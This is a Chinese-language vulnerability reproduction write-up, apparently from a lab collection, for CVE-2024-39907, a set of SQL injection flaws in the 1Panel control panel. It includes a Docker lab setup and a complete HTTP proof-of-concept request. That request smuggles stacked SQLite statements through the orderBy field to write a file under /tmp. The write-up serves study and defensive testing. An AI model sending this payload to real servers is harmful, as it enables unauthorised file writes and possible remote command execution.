# CVE-2024-39907：1Panel控制面板SQL注入漏洞深度分析

CVE-2024-39907是一个影响1Panel服务器管理控制面板的严重安全漏洞，涉及多个SQL注入点，可能导致远程命令执行(RCE)。以下是对该漏洞的详细技术分析。

## 漏洞概述

CVE-2024-39907是1Panel控制面板中存在的多个SQL注入漏洞集合，这些漏洞存在于1Panel的多个接口中，部分注入点由于过滤不善，可能导致攻击者实现任意文件写入，最终达成远程命令执行(RCE)12。

1Panel是一款基于Web的Linux服务器管理控制面板，提供服务器管理的图形化界面。该漏洞影响1Panel v1.10.9-lts及更早版本，已在v1.10.12-tls版本中得到修复2。

参考链接：

- [nuclei-templates/http/cves/2024/CVE-2024-39907.yaml at main · projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml)
- https://hub.docker.com/r/moelin/1panel

## 漏洞环境

执行如下命令启动一个有漏洞的1Panel v1.10.10-lts：

```
docker compose up -d
```

- 默认端口：`10086`
- 默认账户：`1panel`
- 默认密码：`1panel_password`
- 默认输入：`entrance`

然后访问`http://your-ip:10086/entrance`即可看到登录页面，使用默认账户密码登录。

## 漏洞复现

漏洞主要存在于1Panel的API接口中，特别是`/api/v1/hosts/command/search`接口。攻击者可以通过精心构造的请求参数触发SQL注入2。

一个典型的POC请求如下：

```
POST /api/v1/hosts/command/search HTTP/1.1
Host: 192.168.8.128:8877
Accept-Language: zh
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Referer: http://192.168.8.128:8877/aaa
Accept-Encoding: gzip, deflate
Cookie: psession=you-session
Connection: close
Content-Length: 83

{
  "page":1,
  "pageSize":10,
  "groupID":0,
  "orderBy":"3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;",
  "order":"ascending",
  "name":"a"
}
```

通过尝试创建数据库文件来确认注入是否成功。

![image-20250618234105405](https://github.com/vulhub/vulhub/1panel/CVE-2024-39907/1.png)

## 限制与注意事项

1. **需要有效会话**：如Cookie中的`psession=you-session`所示，攻击者需要先获取有效认证凭证
2. **SQLite特定语法**：这个POC使用了SQLite特有的命令，表明1Panel后端使用SQLite数据库
